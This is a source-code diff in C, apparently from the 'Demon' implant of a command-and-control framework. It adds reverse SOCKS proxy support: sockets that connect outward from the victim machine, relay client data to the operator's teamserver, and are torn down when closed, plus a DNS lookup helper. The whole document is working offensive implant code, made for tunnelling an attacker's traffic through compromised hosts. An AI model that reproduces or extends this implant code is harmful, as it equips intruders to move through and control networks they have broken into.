@@ -18,7 +18,7 @@ DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
 
         if ( nret == SOCKET_ERROR )
         {
-            PUTS( "nret == SOCKET_ERROR" )
+            PUTS( "recv Failed" )
             return 0;
         }
     }
@@ -35,7 +35,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
     BOOL         IoBlock  = TRUE;
     DWORD        Result   = 0;
 
-    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] LclAddr:[%lx] LclPort:[%lx] FwdAddr:[%lx] FwdPort:[%lx]\n", WinSock, Type, LclAddr, LclPort, FwdAddr, FwdPort )
+    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] LclAddr:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, LclAddr, LclPort, FwdAddr, FwdPort )
 
     /* if we specified SOCKET_TYPE_NONE then that means that
      * the caller only wants an object inserted into the socket linked list. */
@@ -68,30 +68,53 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
 
         PRINTF( "SockAddr:  \n"
                 " - Addr: %x\n"
-                " - Port: %x\n",
+                " - Port: %d\n",
                 SockAddr.sin_addr.s_addr,
                 SockAddr.sin_port
         )
 
-        /* set socket to non blocking */
-        if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
+        if ( Type == SOCKET_TYPE_REVERSE_PROXY )
         {
-            PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
-            goto CLEANUP;
-        }
+            /* connect to host:port */
+            if ( Instance.Win32.connect( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+            {
+                PRINTF( "connect failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
 
-        /* bind the socket */
-        if ( Instance.Win32.bind( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
-        {
-            PRINTF( "bind failed: %d\n", NtGetLastError() )
-            goto CLEANUP;
-        }
+            /* set socket to non blocking */
+            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
+            {
+                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
 
-        /* now listen... */
-        if ( Instance.Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
+            PUTS( "Connected to host" )
+        }
+        else
         {
-            PRINTF( "bind failed: %d\n", NtGetLastError() )
-            goto CLEANUP;
+            /* set socket to non blocking */
+            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
+            {
+                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
+
+            /* bind the socket */
+            if ( Instance.Win32.bind( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+            {
+                PRINTF( "bind failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
+
+            /* now listen... */
+            if ( Instance.Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
+            {
+                PRINTF( "listen failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
+
+            PUTS( "Started listening..." )
         }
     }
 
@@ -199,17 +222,24 @@ VOID SocketRead()
         if ( ! Socket )
             break;
 
-        /* reads data from connected clients */
-        if ( Socket->Type == SOCKET_TYPE_CLIENT )
+        /* reads data from connected clients/socks proxies */
+        if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
         {
             /* check how much we can read */
             if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &Buffer.Length ) == SOCKET_ERROR )
             {
-                /* Tell the Socket remover that it can remove this one. */
-                Socket->Type = SOCKET_TYPE_REMOVED;
+                PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
+
+                /* Tell the Socket remover that it can remove this one.
+                 * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
+                 * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
+                Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
+                        SOCKET_TYPE_CLIENT_REMOVED :
+                        SOCKET_TYPE_SOCKS_REMOVED  ;
 
                 /* Next socket please */
                 Socket = Socket->Next;
+
                 continue;
             }
 
@@ -228,6 +258,7 @@ VOID SocketRead()
                     /* tell the teamserver to write to the socket of the forwarded host */
                     PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
                     PackageAddInt32( Package, Socket->ID );
+                    PackageAddInt32( Package, Socket->Type );
 
                     /* add the data we read from the client socket */
                     PackageAddBytes( Package, Buffer.Buffer, Buffer.Length );
@@ -251,8 +282,11 @@ VOID SocketFree( PSOCKET_DATA Socket )
 {
     PPACKAGE Package = NULL;
 
-    if ( Socket->Type == SOCKET_TYPE_REMOVED )
+    /* do we want to remove a reverse port forward client ? */
+    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
     {
+        PUTS( "REVERSE PORT FORWARD CLIENT REMOVED" )
+
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
@@ -267,6 +301,24 @@ VOID SocketFree( PSOCKET_DATA Socket )
         /* Forward Host & Port data */
         PackageAddInt32( Package, Socket->FwdAddr );
         PackageAddInt32( Package, Socket->FwdPort );
+
+        /* Send the socket open request */
+        PackageTransmit( Package, NULL, NULL );
+        Package = NULL;
+    }
+
+    /* do we want to remove a socks proxy client ? */
+    else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
+    {
+        PUTS( "SOCKS PROXY CLIENT REMOVED" )
+
+        /* create socket response package */
+        Package = PackageCreate( DEMON_COMMAND_SOCKET );
+
+        /* socket package header */
+        PackageAddInt32( Package, SOCKET_COMMAND_CLOSE );
+        PackageAddInt32( Package, Socket->ID   );
+        PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );
 
         /* Send the socket open request */
         PackageTransmit( Package, NULL, NULL );
@@ -295,14 +347,17 @@ VOID SocketPush()
     /* Read data from the clients and send it to our server/forwarded host */
     SocketRead();
 
-    /* kill every dead/removed socket */
+    /* kill every dead/removed socket
+     * TODO: re-work on this.
+     *       make that after the socket got used close it.
+     *       maybe add a timeout ? after the socket didn't got used after a certain period of time. */
     Socket = Instance.Sockets;
     for ( ;; )
     {
         if ( ! Socket )
             break;
 
-        if ( Socket->Type == SOCKET_TYPE_REMOVED )
+        if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED || Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
         {
             /* we are at the beginning. */
             if ( ! SkLast )
@@ -324,4 +379,26 @@ VOID SocketPush()
             Socket = Socket->Next;
         }
     }
+}
+
+/*!
+ * Query the IP from the specified domain
+ * @param Domain
+ * @return Ip address
+ */
+DWORD DnsQueryIP( LPSTR Domain )
+{
+    DNS_STATUS  DnsStatus = { 0 };
+    PDNS_RECORD DnsRecord = NULL;
+
+    PRINTF( "Query Domain: %s\n", Domain )
+
+    DnsStatus = Instance.Win32.DnsQuery_A( Domain, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &DnsRecord, NULL);
+    if ( DnsStatus != ERROR_SUCCESS || DnsRecord == NULL )
+    {
+        PRINTF( "DnsQuery_A Failed: %d\n", NtGetLastError() )
+        return 0;
+    }
+
+    return DnsRecord->Data.A.IpAddress;
 }
